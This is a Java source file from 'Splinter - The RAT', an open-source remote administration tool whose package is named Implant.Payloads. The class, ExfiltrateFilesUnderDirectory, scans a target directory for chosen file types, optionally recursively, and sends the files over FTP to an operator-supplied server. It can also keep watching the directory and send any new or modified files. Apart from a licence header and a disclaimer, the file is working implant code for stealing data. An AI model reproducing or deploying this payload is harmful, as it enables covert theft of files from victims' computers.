/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.Payloads;

import Implant.Driver;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;
import Implant.Splinter_IMPLANT;
import java.io.File;
import java.io.PrintWriter;
import java.util.ArrayList;

public class ExfiltrateFilesUnderDirectory
{
  private static final String strMyClassName = "ExfiltrateFilesUnderDirectory";

  public static ArrayList<File> scanAndExfiltrateFiles(File topFolderToList, String fileTypes, boolean recursively_Search_And_Include_AllSubDirectories_As_Well, ArrayList<File> alCurrFiles_ok_to_be_null, ArrayList alCurrFilesLastModified_ok_to_be_null, Splinter_IMPLANT implant_ok_to_be_null, String FTP_Address, int FTP_Port, boolean orbitDirectoryEngaged)
  {
    try
    {
      if ((topFolderToList == null) || (!topFolderToList.exists()))
      {
        return null;
      }

      if ((fileTypes == null) || (fileTypes.trim().equals("")))
      {
        fileTypes = "*.*";
      }

      if (!fileTypes.contains("."))
      {
        fileTypes = "*." + fileTypes.trim();
      }

      ArrayList alNewFilesUnderDirectory = Driver.listFilesUnderDirectory(topFolderToList, fileTypes, recursively_Search_And_Include_AllSubDirectories_As_Well, null, implant_ok_to_be_null);

      if ((alNewFilesUnderDirectory == null) || (alNewFilesUnderDirectory.size() < 1))
      {
        return alCurrFiles_ok_to_be_null;
      }

      PrintWriter pw = null;
      if (implant_ok_to_be_null != null)
      {
        pw = implant_ok_to_be_null.pwOut;
      }

      if (!orbitDirectoryEngaged)
      {
        sendFiles(alNewFilesUnderDirectory, FTP_Address, FTP_Port, pw, FTP_ServerSocket.FILE_TYPE_DATA_EXFIL);
      }
      else if (alCurrFiles_ok_to_be_null == null)
      {
        sendFiles(alNewFilesUnderDirectory, FTP_Address, FTP_Port, pw, FTP_ServerSocket.FILE_TYPE_ORBITER_PAYLOAD);

        alCurrFiles_ok_to_be_null = alNewFilesUnderDirectory;
      }
      else
      {
        ArrayList alKeeper = new ArrayList();
        File fleKeeper = null;
        int index = 0;
        for (int i = 0; (alCurrFiles_ok_to_be_null != null) && (i < alNewFilesUnderDirectory.size()); i++)
        {
          fleKeeper = (File)alNewFilesUnderDirectory.get(i);

          if (!alCurrFiles_ok_to_be_null.contains(fleKeeper))
          {
            alKeeper.add(fleKeeper);
          }
          else if ((alCurrFiles_ok_to_be_null.contains(fleKeeper)) && (alCurrFilesLastModified_ok_to_be_null != null))
          {
            index = alCurrFiles_ok_to_be_null.indexOf(fleKeeper);

            if ((index <= alCurrFilesLastModified_ok_to_be_null.size()) && (index >= 0))
            {
              if (fleKeeper.lastModified() > Long.parseLong(alCurrFilesLastModified_ok_to_be_null.get(index).toString()))
              {
                alKeeper.add(fleKeeper);
              }
            }
          }

        }

        if (alKeeper.size() > 0)
        {
          sendFiles(alKeeper, FTP_Address, FTP_Port, pw, FTP_ServerSocket.FILE_TYPE_ORBITER_PAYLOAD);
        }
      }

      return alNewFilesUnderDirectory;
    }
    catch (Exception e)
    {
      Driver.eop("scanAndExfiltrate", "ExfiltrateFilesUnderDirectory", e, e.getLocalizedMessage(), false);
    }

    return alCurrFiles_ok_to_be_null;
  }

  public static boolean sendFiles(ArrayList<File> alFilesToSend, String FTP_Address, int FTP_Port, PrintWriter pwOut, String FTP_SERVER_TYPE)
  {
    try
    {
      if ((alFilesToSend == null) || (alFilesToSend.size() < 1))
      {
        return false;
      }

      File fle = null;

      double steps = 0.0D;
      try
      {
        steps = 100.0D / alFilesToSend.size(); } catch (Exception e) { steps = -1.0D; }


      IncrementObject fileTransferStatus = new IncrementObject(steps);

      for (int i = 0; i < alFilesToSend.size(); i++)
      {
        fle = (File)alFilesToSend.get(i);

        if ((fle == null) || (!fle.exists()) || (!fle.isFile()))
        {
          fileTransferStatus.incrementStep();
        }
        else
        {
          FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Address, FTP_Port, 4096, fle, pwOut, false, FTP_SERVER_TYPE, fileTransferStatus);
          FTP_Sender.start();
        }

      }

      Driver.sop("\nScheduling complete: " + alFilesToSend.size() + " files queued for transfer");

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendFiles", "ExfiltrateFilesUnderDirectory", e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}